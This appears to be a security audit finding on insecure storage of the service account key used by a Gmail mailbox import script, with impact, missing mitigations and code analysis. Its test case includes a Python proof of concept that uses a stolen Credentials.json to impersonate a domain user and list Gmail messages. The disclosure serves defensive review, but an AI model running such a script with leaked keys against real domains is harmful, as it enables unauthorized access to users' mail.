### Vulnerability 1: Insecure Storage of Service Account Private Key

- **Description:**
    1. The `import-mailbox-to-gmail.py` script requires a service account JSON private key file, specified using the `--json` parameter.
    2. This JSON file grants domain-wide delegation, allowing the script to access and modify Gmail data of all users in the Google Workspace domain.
    3. If this `Credentials.json` file is stored insecurely (e.g., in a publicly accessible directory, unencrypted on a shared file system, or committed to version control), an attacker can gain unauthorized access to it.
    4. Once the attacker obtains the `Credentials.json` file, they can use it to authenticate as the service account.
    5. By impersonating the service account, the attacker can bypass normal Gmail authentication and access the Gmail accounts of any user within the Google Workspace domain.
    6. The attacker can then read, modify, delete emails, and perform other actions as any user in the domain.

- **Impact:**
    - Complete compromise of the Google Workspace domain's Gmail accounts.
    - Unauthorized access to sensitive email data for all users in the domain.
    - Potential data breaches, compliance violations, and reputational damage for the organization.
    - Attackers can use compromised accounts for further malicious activities, such as sending phishing emails or spreading malware.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - Documentation in `README.md` provides a warning during service account creation: "**This JSON file contains a private key that potentially allows access to all users in your domain. Protect it like you'd protect your admin password. Don't share it with anyone.**"
    - This mitigation relies solely on the administrator reading and understanding the documentation and implementing secure storage practices independently.

- **Missing Mitigations:**
    - **Secure Storage Recommendations:** Lack of specific guidance or recommendations on secure storage practices for the `Credentials.json` file. This could include suggesting the use of:
        - Secrets management systems (e.g., HashiCorp Vault, Google Secret Manager).
        - Encrypted file systems or storage solutions.
        - Access control lists (ACLs) to restrict access to the file.
    - **Automated Security Checks:** The script does not include any automated checks to detect insecure storage of the `Credentials.json` file, such as:
        - Checking file permissions to ensure it's not world-readable.
        - Warning messages if the file is located in a common or insecure directory.
    - **Key Rotation/Revocation Guidance:** No instructions or tools are provided for rotating or revoking the service account key if it is suspected of being compromised.

- **Preconditions:**
    1. A Google Workspace administrator must have successfully created a service account and downloaded the `Credentials.json` file as per the instructions in `README.md`.
    2. The administrator must have stored the `Credentials.json` file in a location accessible to the attacker. This could be due to:
        - Misconfiguration of file permissions.
        - Storage on an insecure or shared system.
        - Accidental exposure through other vulnerabilities or misconfigurations.
        - Insider threat.

- **Source Code Analysis:**
    1. The `import-mailbox-to-gmail.py` script uses the `oauth2client.service_account.ServiceAccountCredentials.from_json_keyfile_name` function to load credentials from the JSON file specified by the `--json` argument:
    ```python
    def get_credentials(username):
      credentials = ServiceAccountCredentials.from_json_keyfile_name(
          args.json,
          scopes=SCOPES).create_delegated(username)
      return credentials
    ```
    2. The `args.json` variable, which holds the path to the JSON key file, is directly taken from user input via command-line arguments without any security checks related to file storage.
    3. The script's functionality relies on the assumption that the `Credentials.json` file is securely stored and accessible only to authorized users.
    4. There is no code within the script to enforce or verify secure storage of the private key file. The security solely depends on the user's operational environment and adherence to the warning in the documentation.

- **Security Test Case:**
    1. **Setup:**
        - Assume you are an external attacker and have gained access (e.g., through compromised credentials, or another vulnerability) to a system where a Google Workspace administrator has used the `import-mailbox-to-gmail.py` script.
        - Locate the `Credentials.json` file.  Assume for this test case, the administrator has mistakenly stored it in a publicly readable directory `/tmp/credentials.json`.
        - Copy the `/tmp/credentials.json` file to your attacker machine.
        - Install Python 2.7 and the required libraries: `google-api-python-client`, `PyOpenSSL`, `oauth2client` on your attacker machine.
    2. **Exploit Script (attacker.py):** Create a Python script named `attacker.py` on your attacker machine with the following content:
    ```python
    #!/usr/bin/env python
    import sys
    from apiclient import discovery
    import httplib2
    from oauth2client.service_account import ServiceAccountCredentials

    JSON_FILE_PATH = 'credentials.json' # Path to the copied Credentials.json
    SCOPES = ['https://www.googleapis.com/auth/gmail.readonly'] # Minimal scope for testing
    USER_EMAIL = 'test.user@yourdomain.com' # Replace with a valid user in the target domain

    def get_service():
      credentials = ServiceAccountCredentials.from_json_keyfile_name(
          JSON_FILE_PATH,
          scopes=SCOPES).create_delegated(USER_EMAIL)
      http = credentials.authorize(httplib2.Http())
      service = discovery.build('gmail', 'v1', http=http)
      return service

    if __name__ == '__main__':
      service = get_service()
      try:
        results = service.users().messages().list(userId=USER_EMAIL, maxResults=1).execute()
        messages = results.get('messages', [])
        if not messages:
          print "No messages found."
        else:
          print "Messages found:"
          for message in messages:
            print message['id']
        print "[+] Successfully accessed Gmail API using compromised service account key!"

      except Exception as e:
        print "[-] Error accessing Gmail API:"
        print e
        sys.exit(1)
    ```
        - Replace `'credentials.json'` in `JSON_FILE_PATH` with the actual path to where you saved the copied `Credentials.json` file on your attacker machine if it's not in the same directory.
        - Replace `'test.user@yourdomain.com'` with the email address of a test user in the target Google Workspace domain.
    3. **Run Exploit:** Execute the `attacker.py` script from your attacker machine:
    ```bash
    python attacker.py
    ```
    4. **Verification:**
        - If the script outputs `[+] Successfully accessed Gmail API using compromised service account key!` and lists a message ID, it confirms that you have successfully used the compromised `Credentials.json` file to access the Gmail account of the specified user in the target domain.
        - This demonstrates the vulnerability of insecurely storing the service account private key, allowing unauthorized access to the entire Google Workspace domain's Gmail data.